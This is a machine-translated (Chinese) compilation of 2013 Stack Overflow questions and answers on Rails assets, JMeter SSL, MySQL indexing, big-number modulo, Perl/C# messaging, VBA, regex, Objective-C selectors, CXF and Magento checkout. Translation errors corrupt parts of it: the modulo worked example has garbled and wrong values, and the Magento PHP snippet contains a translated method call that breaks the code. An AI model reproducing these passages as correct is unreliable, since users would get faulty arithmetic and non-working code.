      // create a DOM node from the given html
      var div = document.createElement('div');
      div.innerHTML = html;
      var node = div.childNodes[0];

      // get selection if any, insert html as a Node
      var range = se.getRng();
      range.deleteContents();
      range.insertNode(node);
      range.setEndAfter(node);
      range.setStartAfter(node);
      setFocusBackToText();
    };

    // get nicEdit selected instance - se
    var se = this.ne.selectedInstance;
    if(se){
      emoticonsToolbar.attach_to($(this.button), paste_icon_html);
    } else {
      // no editor selected, so let select this one
      setFocusBackToText();
    }
  };
};

var emoticonButtonOptions = {
  buttons : {
    'emoticonToolbar' : {name : __('Emoticon menu bar button'), type : 'nicEditorEmoticonButton'}
  }, iconFiles : {'emoticonToolbar' : '/assets/emoticons/ab.gif'}
}; 
```

我确实跑了`rake assets:precompile`

**更新 1**：添加了 aplication.js 片段

```
//= require jquery
//= require jquery-ui
//= require jquery_ujs
//= require_self
//= require_tree ./control
//= require_tree ./popup
//= require_tree ./global
//= require_tree ./lib
//= require hide_on_body_click.js
//= require popup_messages.js
//= require root.js
//= require diaries.js
//= require emoticons.js

//... and plenty of code below 
```

**更新2**：我确定问题出在`range.insertNode(node)`，因为`range.deleteContent()`确实删除了选择，并且`setFocusBackToText()`也完成了它的工作。

**应用程序/资产/javascripts/emoticons.js**

```
 // get selection if any, insert html as a Node
  var range = se.getRng();
  range.deleteContents();
  range.insertNode(node); // <- doesn't work in production environment
  range.setEndAfter(node);
  range.setStartAfter(node);
  setFocusBackToText(); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-01T18:28:26.667

在你的情况下，我建议使用`index.js`file 。它在这个[Rails 指南](http://guides.rubyonrails.org/asset_pipeline.html#how-to-use-the-asset-pipeline)中有详细描述（查找 2.1.2）。

在您的目录中`app/assets/javascripts/control/`，您应该创建一个名为`index.js`（简化的）内容的新清单文件：

```
//= require_tree . 
```

然后在你的`application.js`：

```
//= require control 
```

（注意带有 index.js 文件的目录名称应与 中所需的库匹配`application.js`）。

通过这种方式，您可以嵌套您的资产库并减少主清单文件中的行数。

# apache - 通过 Apache JMeter 连接到自签名 SSL 网站

> ID：15163081
> 
> 赞同：3
> 
> 时间：2013-03-01T17:07:50.173
> 
> 标签：apache, ssl, jmeter

我尝试在使用自签名 SSL 证书的网站上进行性能测试。

我的 JMeter 测试计划在“常规”SSL 站点（使用正确签名的证书）和没有 SSL 的测试页面上正常工作。一旦我访问测试页面（使用自签名证书），JMeter 只会产生错误。我试过的：

1.  存储证书（通过浏览器）并将其导入 Java（通过控制面板“Java”）

2.  将证书添加到密钥库并通过以下命令行启动 JMeter（我不知道如何以另一种方式“引用 JVM 中的密钥库”？！）

    > java -jar "ApacheJMeter.jar" -Djavax.net.ssl.keyStore="C:\Program Files\Java\jre7\lib\security\cacerts" -Djavax.net.ssl.keyStorePassword=changeit

感谢您提示如何让 JMeter 访问测试页面 :)

结果（JMeter 输出）当前是：

```
javax.net.ssl.SSLHandshakeException: Remote host closed connection during handshake
    at sun.reflect.GeneratedConstructorAccessor28.newInstance(Unknown Source)
    at sun.reflect.DelegatingConstructorAccessorImpl.newInstance(Unknown Source)
    at java.lang.reflect.Constructor.newInstance(Unknown Source)
    at sun.net.www.protocol.http.HttpURLConnection$6.run(Unknown Source)
    at sun.net.www.protocol.http.HttpURLConnection$6.run(Unknown Source)
    at java.security.AccessController.doPrivileged(Native Method)
    at sun.net.www.protocol.http.HttpURLConnection.getChainedException(Unknown Source)
    at sun.net.www.protocol.http.HttpURLConnection.getInputStream(Unknown Source)
    at java.net.HttpURLConnection.getResponseCode(Unknown Source)
    at sun.net.www.protocol.https.HttpsURLConnectionImpl.getResponseCode(Unknown Source)
    at org.apache.jmeter.protocol.http.sampler.HTTPJavaImpl.readResponse(HTTPJavaImpl.java:264)
    at org.apache.jmeter.protocol.http.sampler.HTTPJavaImpl.sample(HTTPJavaImpl.java:520)
    at org.apache.jmeter.protocol.http.sampler.HTTPSamplerProxy.sample(HTTPSamplerProxy.java:62)
    at org.apache.jmeter.protocol.http.sampler.HTTPSamplerBase.sample(HTTPSamplerBase.java:1088)
    at org.apache.jmeter.protocol.http.sampler.HTTPSamplerBase.sample(HTTPSamplerBase.java:1077)
    at org.apache.jmeter.threads.JMeterThread.process_sampler(JMeterThread.java:428)
    at org.apache.jmeter.threads.JMeterThread.run(JMeterThread.java:256)
    at java.lang.Thread.run(Unknown Source)
Caused by: javax.net.ssl.SSLHandshakeException: Remote host closed connection during handshake
    at sun.security.ssl.SSLSocketImpl.readRecord(Unknown Source)
    at sun.security.ssl.SSLSocketImpl.performInitialHandshake(Unknown Source)
    at sun.security.ssl.SSLSocketImpl.startHandshake(Unknown Source)
    at sun.security.ssl.SSLSocketImpl.startHandshake(Unknown Source)
    at sun.net.www.protocol.https.HttpsClient.afterConnect(Unknown Source)
    at sun.net.www.http.HttpClient.parseHTTPHeader(Unknown Source)
    at sun.net.www.http.HttpClient.parseHTTP(Unknown Source)
    at sun.net.www.protocol.http.HttpURLConnection.getInputStream(Unknown Source)
    at sun.net.www.protocol.http.HttpURLConnection.getHeaderField(Unknown Source)
    at java.net.URLConnection.getHeaderFieldLong(Unknown Source)
    at java.net.URLConnection.getContentLengthLong(Unknown Source)
    at java.net.URLConnection.getContentLength(Unknown Source)
    at sun.net.www.protocol.https.HttpsURLConnectionImpl.getContentLength(Unknown Source)
    at org.apache.jmeter.protocol.http.sampler.HTTPJavaImpl.readResponse(HTTPJavaImpl.java:230)
    ... 7 more
Caused by: java.io.EOFException: SSL peer shut down incorrectly
    at sun.security.ssl.InputRecord.read(Unknown Source)
    ... 21 more 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2014-03-06T15:22:27.367

查看此答案：[JMeter 和可选的 SSL 客户端证书](https://stackoverflow.com/questions/14607897/jmeter-and-optional-ssl-client-certificate#answer-14693655)查看您在 JMeter HTTP 请求中的端口号。https 的标准端口是 443。

# mysql - 在大型表上使用多个 where 条件提高 mysql 查询的性能

> ID：15163083
> 
> 赞同：3
> 
> 时间：2013-03-01T17:07:55.367
> 
> 标签：mysql, performance, query-optimization

我有一个 mysql 表，它可能包含数百万行数据——在某些极端情况下高达 1 亿行。我开发的一个应用程序经常查询这些数据，并且我已经尽我所能来优化它 - 在大多数情况下它工作得非常快，因为我们只搜索数据的一个非常小的子集（与位置相关） .

表结构：

```
CREATE TABLE `prism_actions` (
  `id` int(11) unsigned NOT NULL auto_increment,
  `action_time` timestamp NOT NULL default CURRENT_TIMESTAMP,
  `action_type` varchar(25) NOT NULL,
  `player` varchar(16) NOT NULL,
  `world` varchar(255) NOT NULL,
  `x` int(11) NOT NULL,
  `y` int(11) NOT NULL,
  `z` int(11) NOT NULL,
  `block_id` mediumint(5) unsigned NOT NULL,
  `block_subid` mediumint(5) unsigned NOT NULL,
  `data` varchar(255) NOT NULL,
  PRIMARY KEY  (`id`),
  KEY `x` (`x`),
  KEY `action_type` (`action_type`),
  KEY `player` (`player`),
  KEY `block_id` (`block_id`)
) ENGINE=MyISAM  DEFAULT CHARSET=latin1; 
```

对于我们在 WHERE 语句中最常使用的字段，我有几个基本索引，当在只有一个条件的查询中使用时 - 它非常快。

我正在运行这些测试的示例表有 2200 万条记录。

例子：

```
SELECT prism_actions.id FROM prism_actions WHERE prism_actions.action_type = 'block-break' LIMIT 1000;
1000 rows in set (0.00 sec)

SELECT prism_actions.id FROM prism_actions WHERE prism_actions.block_id = 2 LIMIT 1000;
1000 rows in set (0.01 sec) 
```

我的问题是，对于我们在查询中使用的每个条件（大多数查询通常有几个条件），查询需要更长的时间。

```
SELECT prism_actions.id FROM prism_actions WHERE prism_actions.action_type = 'block-break' AND prism_actions.block_id = 2 LIMIT 1000;
1000 rows in set (0.79 sec) 
```

完整查询可以接受 0.79 秒，但这只是使用部分条件。

一个真正的查询更像是：

```
SELECT prism_actions.id FROM prism_actions WHERE prism_actions.action_type = 'block-break' AND prism_actions.player = 'viveleroi' AND prism_actions.block_id = 2 LIMIT 1000;
1000 rows in set (2.22 sec) 
```

在一个条件下我们运行`0.01`，两个我们运行，`0.79`三个我们在`2.2`几秒钟内运行，这太长了。

我将研究如何更好地设计我的索引，但我对当前的数据库架构和索引非常满意。

但是，当这样一起使用时，我可以尝试使条件更快吗？

**更新**

我花时间将表格转换为外键格式。player、action_type 和 world 列数据被移动到单独的表中，并且它们的 ID 存储在原始表中。花了几个小时来迁移数据。

但是，我正在重新运行我之前使用过的相同查询，虽然我看到一些查询速度有所提高，但我发现其他查询几乎没有变化。

上面 0.79 秒查询的转换版本运行速度大致相同：

```
SELECT prism_actions.id FROM prism_actions WHERE prism_actions.actiontype_id = 1 AND prism_actions.block_id = 2 LIMIT 1000;
1000 rows in set (0.73 sec) 
```

block_id col 仍然具有来自原始表模式的索引。

以 player_id 为条件的查询运行非常缓慢，因此我在列中添加了一个索引，现在查询速度非常快。

但是，在以真实用户的几个查询示例并针对此表结构更新它们之后，我发现速度没有变化。

```
SELECT prism_actions.id FROM prism_actions WHERE (prism_actions.actiontype_id = 2 OR prism_actions.actiontype_id = 1) AND (prism_actions.player_id = 1127) AND prism_actions.action_time >= '2013-02-22 07:47:54' LIMIT 1000; 
```

以前拍`5.83 sec`的，现在拍的`5.29 sec`

**编辑 - 似乎是时间戳。从上面的查询中取出时间戳条件会在 0.01 秒内返回结果。为时间戳添加索引什么都不做 - 想法？**

到目前为止，我真正看到的只是某些区域的速度略有提高，由于我们存储了重复的字符串，因此节省了少量文件空间——但到目前为止，还没有什么值得让拥有这么大数据库的数百名用户花费一天的时间时间转换数据。

对我可能索引东西等的其他方式有什么建议吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-01T17:56:20.563

MySQL v5.5：您可以创建`PARTITION BY RANGE COLUMNS`为：

```
CREATE TABLE `prism_actions` (
  `id` int(11) UNSIGNED NOT NULL AUTO_INCREMENT,
  `action_time` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP,
  `action_type` varchar(25) NOT NULL,
  `player` varchar(16) NOT NULL,
  `world` varchar(255) NOT NULL,
  `x` int(11) NOT NULL,
  `y` int(11) NOT NULL,
  `z` int(11) NOT NULL,
  `block_id` mediumint(5) UNSIGNED NOT NULL,
  `block_subid` mediumint(5) UNSIGNED NOT NULL,
  `data` varchar(255) NOT NULL,
  PRIMARY KEY  (`id`),
  KEY `x` (`x`),
  KEY `action_type` (`action_type`),
  KEY `player` (`player`),
  KEY `block_id` (`block_id`)
) ENGINE=MyISAM  DEFAULT CHARSET=latin1
PARTITION BY RANGE COLUMNS(action_type, player, block_id)(
PARTITION p0 VALUES LESS THAN ('dddddddd','dddddddd',1000000),
PARTITION p1 VALUES LESS THAN ('gggggggg','gggggggg',2000000),
PARTITION p2 VALUES LESS THAN ('jjjjjjjj','jjjjjjjj',3000000),
PARTITION p3 VALUES LESS THAN ('mmmmmmmm','mmmmmmmm',4000000),
PARTITION p4 VALUES LESS THAN ('pppppppp','pppppppp',5000000),
PARTITION p5 VALUES LESS THAN ('ssssssss','ssssssss',6000000),
PARTITION p6 VALUES LESS THAN ('uuuuuuuu','uuuuuuuu',7000000),
PARTITION p7 VALUES LESS THAN (MAXVALUE,MAXVALUE,MAXVALUE)
); 
```

最坏的情况是对于任何给定的集合`(action_type, player, block_id)`，它们只能属于一个分区。因此，与原始查询相比，它更好。

加分速度，如果您可以分析列值的频率分布并相应地进行分区。上面的分区是粗略的间隔。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-01T17:16:24.073

移动所有文本列（动作类型、玩家、世界）所有这些都是文本列到一个新表。

这将减少数据库大小并保留此表中的参考编号。

这将显着提高性能。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-01T20:21:48.387

我会单独留下你的桌子，以防止在你的结果集之后需要再次加入。您只需要一个索引，其中包含 where 的所有键列，而不是单独的每一个。我会尝试根据您首先遇到的最小结果集来优化它，例如 2200 万条记录，我敢打赌基于 Block_ID = 2 的记录不少，而基于玩家的记录则更少。

所以，我会有一个索引

```
create index multipart on prism_actions ( Player, Block_ID, Action_Type ); 
```

作为单一索引，而不是您目前拥有的单个字段。这允许引擎直接跳转到给定的玩家，现在从 2200 万，下降到 2000 个条目，block ID = 2 现在下降到 200，下降到 action_type = block break.... 20 条记录...显然只是记录计数的任意样本，但复合索引应该是您所需要的。

# c++ - 在 C 中查找 100 位数字 mod 10^9+7 的值

> ID：15163085
> 
> 赞同：0
> 
> 时间：2013-03-01T17:08:00.217
> 
> 标签：c++, numbers, modulo

假设我得到了 100 位数字（输入可以是字符串）。我想找到那个数字 % mod 的值，其中 mod 是 10^9+7。我怎样才能得到答案。我已经使用字符串操作实现了大数的加法和减法函数。

提前致谢 ！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-01T17:27:04.147

10 ⁹是 -7 模 1000000007。

从右侧开始，将 100 位数字`N`分成 9 位数字块（a [0]，a [1 ，...）。]我们有：

```
N = a0 + a1*10^9 + a2*10^18 + ... 
```

模数是[0] - 7*a [1] + 49*a [2] - ...

例如，假设您要计算 87564875326485487234854862386245865486238654862 模 1000000007。您将这个数字字符串从右边开始分成 9 块：

*   一个[0] = 238654862
*   1 [=] 245865486
*   一个[2] = 245865486
*   一个[3] = 854862386
*   一个[4] = 485487234
*   一个[5] = 564875326
*   一个[6] = 87

现在将每个块转换为整数并计算 m = a [0] - 7*a [1] + 49*a [2] - 323*a [3] +...（提示：使用 64 位整数）。

现在`N = m (mod 1000000007)`。

# c# - Perl 与 C# 和 ASP 通信以获取对 Perl 的响应的方法

> ID：15163089
> 
> 赞同：1
> 
> 时间：2013-03-01T17:08:09.607
> 
> 标签：c#, asp.net, .net, perl

我有一个带有 ASP 网页的 .NET 应用程序，该网页使用 C# 进行服务器端处理和动态控制的网页。问题关注的部分是正在提交的表单。然后将提交的表单交给 Perl 脚本进行处理。但在某些情况下，当存在需要用户查看并确认或取消该过程的冲突时。因此，Perl 脚本需要与 C# 类对话，通过网页提示用户验证数据并确认，然后 C# 将确认发送到 Perl 脚本以继续。

截至目前，该项目可以调用 Perl 脚本，并在完成后返回一个显示给用户的响应。我希望能够通过运行 Perl 脚本定期与网页上的用户进行通信。这可能吗？

我查看了 Win32::API，但我不确定这是否是正确的路线。

这是我目前从 C# 调用 Perl 脚本的方式：

```
ProcessStartInfo perlStartInfo = new ProcessStartInfo(@"C:\Perl64\bin\perl.exe");
perlStartInfo = new ProcessStartInfo(@"C:\usr\bin\perl.exe");
perlStartInfo.Arguments = "\"" + webAppPath + "ccrmiddleman.pl\" -action submit -date " + Date1.Text;
perlStartInfo.UseShellExecute = false;
perlStartInfo.RedirectStandardOutput = true;
perlStartInfo.RedirectStandardError = true;
perlStartInfo.CreateNoWindow = false;
Process perl = new Process();
perl.StartInfo = perlStartInfo;
perl.Start();
StdOut.Text = perl.StandardOutput.ReadToEnd();
StdErr.Text = perl.StandardError.ReadToEnd();
perl.WaitForExit(60);enter code here 
```

当提交 Web 表单并执行此 Perl 脚本后，它会将响应异步发送回网页以启动灯箱窗口。

```
<form id="form1" runat="server"><!--div-->
    <asp:ScriptManager ID="ScriptManager1" runat="server"></asp:ScriptManager>
    <asp:Label ID="LabelDate1" runat="server" Text="Date"></asp:Label>
    <asp:Button ID="SubmitBtn" runat="server" Text="Submit" OnClick="SubmitBtn_Click" />
    <asp:Button ID="ClearBtn" runat="server" Text="Clear" UseSubmitBehavior="false" CausesValidation="false" OnClientClick="return CleanForm();" />

    <asp:RegularExpressionValidator ID="Date1Validator" runat="server" ControlToValidate="Date1" ValidationExpression="\d\d/\d\d/\d\d" ErrorMessage="Please enter valid date."></asp:RegularExpressionValidator>
    <asp:CalendarExtender ID="CalendarExtender1" CssClass="input" runat="server" TargetControlID="Date1" TodaysDateFormat="MMMM d, yyyy" Format="MM/dd/yy" OnClientDateSelectionChanged="callserver"></asp:CalendarExtender>
    <asp:FilteredTextBoxExtender ID="DateFilter" runat="server" TargetControlID="Date1" FilterType="Custom, Numbers" ValidChars="/" />

    <asp:UpdatePanel ID="UpdatePanel1" runat="server">
        <ContentTemplate>
            <div id="light" class="white_content"><asp:Label ID="lbText" runat="server" Text="Label"></asp:Label><br /><br /><a href = "javascript:void(0)" onclick = "document.getElementById('light').style.display='none';document.getElementById('fade').style.display='none'">Close</a></div>
            <div id="fade" class="black_overlay"></div>

            <DBWC:DynamicControlsPlaceholder ID="PlaceHolder" runat="server" ControlsWithoutIDs="DontPersist"></DBWC:DynamicControlsPlaceholder>
            <asp:Literal ID="LiteralJS" runat="server" Visible="false"></asp:Literal>
            <asp:Label ID="ccrTitle" runat="server"></asp:Label>

        </ContentTemplate>
        <Triggers>
            <asp:AsyncPostBackTrigger ControlID="CalendarUpdateBtn" EventName="Click" />
            <asp:AsyncPostBackTrigger ControlID="SubmitBtn" EventName="Click" />
            <asp:AsyncPostBackTrigger ControlID="ClearBtn" EventName="Click" />
        </Triggers>
    </asp:UpdatePanel>

<!--/div-->
</form> 
```

非常感谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-07-18T02:10:36.553

鉴于 Perl 需要与 C# 进程“对话”，我的建议是使用在 Perl 和 C# 之间运行良好的消息传递协议。

Stomp - [http://stomp.github.io/](http://stomp.github.io/)是一种选择 - 在 C# 端使用 ApacheNMS，在 Perl 端使用 Net::Stomp，中间使用 Stomp 服务器。

ZeroMQ 可能值得一看 - [http://www.zeromq.org/](http://www.zeromq.org/) - 它可能会简化您不需要单独的代理进程的事情。

AMQP - [http://www.amqp.org/](http://www.amqp.org/)将是第三种选择。

当然，让 Perl 与 C# 对话的另一个好方法是在 C# 代码中设置 Web 服务，并让 Perl 使用 Mojo::UserAgent [https://metacpan.org/module/Mojo::UserAgent](https://metacpan.org/module/Mojo::UserAgent)调用它或类似的。

# mysql - 运行时错误 3265 在此集合中找不到项目

> ID：15163091
> 
> 赞同：0
> 
> 时间：2013-03-01T17:08:19.030
> 
> 标签：mysql, ms-access, vba

我一直收到这个运行时 3265 错误，说在 qdf3 中我的 Sql 的集合中找不到该项目，我使用了很多方法，但它仍然不起作用。所以我徘徊是否有人可以看看我的代码并在这里帮助我，非常感谢！

```
Dim db As DAO.Database 
Dim rs As DAO.Recordset
Dim Sql1 As String
Dim qdf3 As QueryDef
Dim prm3 As Parameter
Set db = CurrentDb
Set qdf3 = db.QueryDefs("SELECT [range] From [Query1] WHERE ( [range] ='NA');")
For Each prm3 In qdf3.Parameters
  prm3.Value = Eval(prm3.Name)
Next prm3

Set rs = qdf3.OpenRecordset(dbOpenDynaset) 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-04T12:51:47.177

我对您为什么尝试将 a 设置为`QueryDef`SQL 查询的结果感到有些困惑，该行不应该更像这样：

```
Set qdf3 = db.QueryDefs("queryname") 
```

如果由于某种原因`query1`要返回查询的名称，那么我建议首先确定适当的查询并将其名称传递给字符串，然后您可以在 querydef 调用中引用它。

* * *

此外，代码中的最后一行：

```
Set rs = qdf3.OpenRecordset(dbOpenDynaset) 
```

我认为您不能以这种方式设置记录集，我不确定您为什么要这样做，但也许这更符合您的要求：

```
Set rs = db.OpenRecordset(qdf3.Name, dbOpenDynaset) 
```

# python - Python 正则表达式：反向引用匹配的正则表达式组

> ID：15163092
> 
> 赞同：0
> 
> 时间：2013-03-01T17:08:18.827
> 
> 标签：python, regex

我正在尝试从我的正则表达式匹配中返回 2 个子组：

```
email_add = "John@Doe.com <John@Doe.com>"
m = re.match(r"(\b[A-Z0-9._%+-]+@[A-Z0-9.-]+\.[A-Z]{2,4}\b) <(\b[A-Z0-9._%+-]+@[A-Z0-9.-]+\.[A-Z]{2,4}\b)", email_add) 
```

但它似乎不匹配：

```
>>> m.group()
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
AttributeError: 'NoneType' object has no attribute 'group' 
```

我怀疑我可能没有正确分组，或者我使用了不正确的单词边界。我试过 \w 而不是 \b 但结果是一样的。

有人可以指出我的错误。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-01T17:12:56.427

您只匹配大写*字母*`A-Z`，因此字符序列和和导致模式不匹配任何内容。*`ohn``oe``com`*

 *添加`re.I`不区分大小写的标志使您的模式工作：

```
>>> import re
>>> email_add = "John@Doe.com <John@Doe.com>"
>>> re.match(r"(\b[A-Z0-9._%+-]+@[A-Z0-9.-]+\.[A-Z]{2,4}\b) <(\b[A-Z0-9._%+-]+@[A-Z0-9.-]+\.[A-Z]{2,4}\b)", email_add)
>>> re.match(r"(\b[A-Z0-9._%+-]+@[A-Z0-9.-]+\.[A-Z]{2,4}\b) <(\b[A-Z0-9._%+-]+@[A-Z0-9.-]+\.[A-Z]{2,4}\b)", email_add, re.I)
<_sre.SRE_Match object at 0x1030d4f10>
>>> _.groups()
('John@Doe.com', 'John@Doe.com') 
```

或者您可以添加`a-z`到字符类中：

```
>>> re.match(r"(\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,4}\b) <(\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,4}\b)", email_add)
<_sre.SRE_Match object at 0x1030d4f10>
>>> _.groups()
('John@Doe.com', 'John@Doe.com') 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-01T17:19:13.230

已指出您的正则表达式有什么问题，但您可能还需要考虑`email.utils.parseaddr`：

```
>>> from email.utils import parseaddr
>>> email_add = "John@Doe.com <John@Doe.com>"
>>> parseaddr(email_add)
('', 'John@Doe.com')  # doesn't get first part, so could assume it's same as 2nd?
>>> email_add = "John Doe <John@Doe.com>"
>>> parseaddr(email_add)
('John Doe', 'John@Doe.com') # does get name and email 
```*

# ruby-on-rails - 国家选择货币显示

> ID：15163093
> 
> 赞同：1
> 
> 时间：2013-03-01T17:08:19.520
> 
> 标签：ruby-on-rails, ruby

我有三个带有大括号中指定字段/列的表：

```
Country (name,currency_id)
Currency (name)
User (name ,country_id,currency_id) 
```

我的要求是在创建用户选择国家时，需要首先显示默认货币，然后在下一个选择行中显示剩余货币。EX：如果我们在国家下拉列表中选择美国，则需要首先显示美元，然后在下一个显示剩余货币

我的想法是用户属于任何国家默认货币是他的国家货币，他也可以选择其他货币。

请帮帮我。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-01T17:14:47.200

你知道用户属于国家，用户属于货币。您还需要国家到 belongs_to default_currency。

```
class Country
  belongs_to :default_currency, :class_name => "Currency" 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-01T19:25:46.807

我假设，您在用户表单中有两个选择框：

```
<%= f.select :country_id, options_for_select(@countries.map{ |c| [c.name, c.id, {'data-currency'=>c.currency.id}] }), {}, :id => 'user_country' %>
<%= f.collection_select :currency_id, @currencies, :id, :name, {}, :id => 'user_currency'%> 
```

国家选择将具有带有额外属性的选项`data-currency`，可在 jquery 中使用以查找正确的货币选项。和`@countries`是`@currencies`：

```
@countries = Country.includes(:currency).all
@currencies = Currency.all 
```

现在在jquery中，

```
$(document).ready(function(){
  $('#user_country').change(function(){
    var currency_id = $(this).find("option:selected").data('currency'); //collects the value of `data-currency` attribute of selected country.

    var currency_option = $('#user_currency').find("option[value='" + currency_id + "']"); //finds the option tag with the currency_id as value.
    $('#user_currency').prepend(currency_option); //prepends the currency_option to the currency select

    //the currency will be the first option now but it will not be selected by default
    //to make it selected replace the last line with
    //$('#user_currency').prepend(currency_option.attr('selected', 'selected'));
  });
}); 
```

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2013-03-01T17:14:54.147

`User`不需要 a`currency_id`因为它可以从`Country`它所属的那个派生出来。您可以添加一个方法来`User`以正确的顺序取回货币。

```
class User < ActiveRecord::Base
  ...
  def ordered_currencies
    # Set up an array of currencies, with the default one first.
    default_currency = self.country.currency
    currencies = [default_currency.name]

    # Add in all other currencies except the default one.
    Currency.where("id != ?", defauly_currency.id).each do |currency|
      currencies << currency.name
    end

    return currencies
  end
  ...
end 
```

在这种情况下，我让该方法返回货币名称，但如果您想返回`Currency`对象本身，您可以轻松更改它。

# objective-c - 使用@selector（方法名）时如何将变量传递给我调用的新方法

> ID：15163100
> 
> 赞同：0
> 
> 时间：2013-03-01T17:08:38.250
> 
> 标签：objective-c, cocoa, selector

好的，非常快速的问题。我正在使用 MKMapAnnotation 向我的 iOS 添加注释。我创建了一个 int 和一个带有公开按钮的注释，该按钮调用方法 loadPano，如下所示：

```
int integervariable;
[disclosureButton addTarget:self 
                     action:@selector(loadPano) 
           forControlEvents:UIControlEventTouchUpInside]; 
```

现在说我想访问方法 load pano 中的整数变量，我将如何做到这一点，我正在努力理解如何在像上面那样调用新方法时将变量传递给新方法。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-01T17:13:48.477

如果您只需要传递与每个公开按钮关联的整数，则可以设置`disclosurebutton.tag = integer value;`.

在标签中传递数据有点笨拙，但在简单的情况下它可以工作。

同样为此工作，请以`loadpano`这种方式声明：

```
- (void)loadPano:(UIButton*)sender
{
    NSInteger relevantInteger = sender.tag;
   // More code here
} 
```

并像这样设置目标：

```
[disclosureButton addTarget:self 
                     action:@selector(loadPano:) 
           forControlEvents:UIControlEventTouchUpInside]; 
```

请注意，该方法现在需要一个参数，因此选择器包含一个冒号。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-01T22:27:43.087

有几种解决方案：

1.  使用标签。但这只能是整数。
2.  将实例变量（可能使用属性访问）添加到按钮的类。这意味着您必须为按钮创建一个自定义类。
3.  最通用：使用关联对象（也称为关联引用），使用运行时函数`objc_setAssociatedObject()`和`objc_getAssociatedObject()`

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-01T17:20:40.353

您不能在 target-action 方法中传递除 sender 和 eventType 以外的值。

**动作消息可以可选地包括作为参数的发送者和事件，以该顺序。**

如果该 integerVariable 是一个常量，那么您可以将其设置为您从中启动该操作的控件的标记（在您的情况下是公开按钮）。

或者

您可以在类中获取一个实例变量，并在 loadPano 方法中访问该值。

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2013-03-01T17:21:35.737

在一般情况下，您可以`NSInvocation`使用您的目标、选择器和它需要的任何参数创建一个实例。然后调用调用的`-invoke`方法将消息发送到目标。

# cxf - Apache CXF 客户端忽略了 WSDL 安全策略

> ID：15163101
> 
> 赞同：2
> 
> 时间：2013-03-01T17:08:40.410
> 
> 标签：cxf

我正在尝试调用 Web 服务，其中 WSDL 包含对请求和响应进行签名和加密的策略。我正在使用 Apache CXF，客户端在 spring 上下文文件中定义如下。Apache CXF (2.6.6) 似乎忽略了 WSDL 中的安全策略并且不对请求进行签名/加密。我有完整的捆绑包 CXF，其中应该包括安全模块。有任何想法吗？

```
<jaxws:client id="commercialStatusClient" 
              name="{http://tempuri.org/}CommercialStatus"
              serviceClass="blah.client.status.ICommercialStatus"
              address="http://blah.co.uk/CommercialStatus.svc" 
              depends-on="keystoreProperties"
              wsdlLocation="http://blah.co.uk/CommercialStatus.svc?wsdl">              
  <jaxws:properties>
    <entry key="ws-security.signature.properties" value-ref="keystoreProperties"/>
    <entry key="ws-security.signature.username" value="clientalias"/>
    <entry key="ws-security.encryption.properties" value-ref="keystoreProperties"/>
    <entry key="ws-security.encryption.username" value="serveralias"/>
    <entry key="ws-security.callback-handler" value-ref="keystorePasswordCallback"/>      
  </jaxws:properties>    
</jaxws:client> 
```

# magento - 快速一键下单功能

> ID：15163108
> 
> 赞同：0
> 
> 时间：2013-03-01T17:08:55.880
> 
> 标签：magento

马上，Magento 平台要求客户注册一个帐户，将他们的物品添加到购物车，然后检查出来。我将如何消除所有这些麻烦并实现一键订购功能而无需添加到购物车？

为了演示，看看这个链接：[http ://royalglasses.pk/index.php/brands/ray-ban-pakistan/ray-ban-aviator-exclusive.html](http://royalglasses.pk/index.php/brands/ray-ban-pakistan/ray-ban-aviator-exclusive.html)

在右侧，您将看到一个“订单”部分，客户可以在其中输入他们的信息并结账，然后他们会为他们希望购买的每件商品执行此操作。

我还要提一下，这家商店只在城内发货，付款方式只有一种，即“货到付款”。因此，通常 Magento 交易中的最后两个步骤（运输方式和付款信息）对我的客户来说毫无用处。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-01T21:05:47.250

我会在不破坏其正常流程的情况下遵循 Magento 逻辑。我之前编写的脚本中的代码片段描述了来宾客户的完整结帐流程。你的应该没有太大的不同。请不要复制和粘贴，查看代码并根据您的需要进行调整。

```
//从发布的表单和购物车和报价模型中加载产品。
$product = Mage::getModel('catalog/product')->load((int) $_POST['product_id']);
$cart = Mage::getSingleton('checkout/cart');
$quote = $cart->getQuote();

//将产品添加到购物车并将会话设置为更新
$params = array('product' => $product->getId(), 'qty' => (int) $_POST['qty']);
$cart->addProduct($product, $params);
$cart->保存（）；
Mage::getSingleton('checkout/session')->setCartWasUpdated(true);

//加载订单流程和交易对象需要的变量来保存订单。
$transaction = Mage::getModel('core/resource_transaction');
$storeId = $customer->getStoreId();
$reservedOrderId = Mage::getSingleton('eav/config')->getEntityType('order')->fetchNewIncrementId($storeId);

//加载订单模型并设置一些默认值
$order = Mage::getModel('销售/订单')
                ->setIncrementId($reservedOrderId)
                ->setStoreId($storeId)
                ->setQuoteId($quote->getId())
                ->setGlobalCurrencyCode('USD')
                ->setBaseCurrencyCode('USD')
                ->setStoreCurrencyCode('USD')
                ->setOrderCurrencyCode('USD');

//将客户指定为客人，$customer 是来自 $_POST['customer'] 的数组      
$order->setCustomerEmail($customer['email'])
                ->setCustomerFirstname($customer['firstname'])
                ->setCustomerLastname($customer['lastname'])
                ->setCustomerGroupId(0)
                ->setCustomerIsGuest(1);

//准备账单地址并将其添加到订单中
$billingAddress = Mage::getModel('sales/order_address')
                ->setStoreId($storeId)
